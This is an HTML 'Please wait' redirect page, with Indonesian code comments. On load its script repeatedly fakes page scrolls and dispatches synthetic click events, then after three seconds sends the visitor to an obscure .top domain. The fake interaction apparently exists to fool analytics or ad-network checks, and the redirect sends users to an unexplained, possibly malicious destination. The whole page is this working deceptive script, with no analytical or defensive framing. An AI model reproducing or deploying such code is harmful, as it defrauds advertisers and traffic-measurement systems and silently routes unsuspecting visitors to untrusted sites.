<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex, nofollow" />
  <title>Redirecting...</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      text-align: center;
      padding-top: 100px;
      color: #333;
    }
  </style>
</head>
<body>
  <h1>Please wait...</h1>
  <p>We are redirecting you to the page</p>

  <script>
    // Simulasi scroll
    function simulateScroll() {
      window.scrollBy(0, 500); // Scroll ke bawah 500px
      setTimeout(simulateScroll, 3000); // Ulangi setiap 3 detik
    }

    // Simulasi klik
    function simulateClick() {
      const clickEvent = new MouseEvent('click', {
        bubbles: true,
        cancelable: true
      });
      document.body.dispatchEvent(clickEvent);
      setTimeout(simulateClick, 5000); // Ulangi setiap 5 detik
    }

    // Redirect setelah 3 detik
    setTimeout(() => {
      window.location.href = "https://whoockeg.top/4/9209440";
    }, 3000);

    // Mulai simulasi interaksi
    simulateScroll();
    simulateClick();
  </script>
</body>
</html>
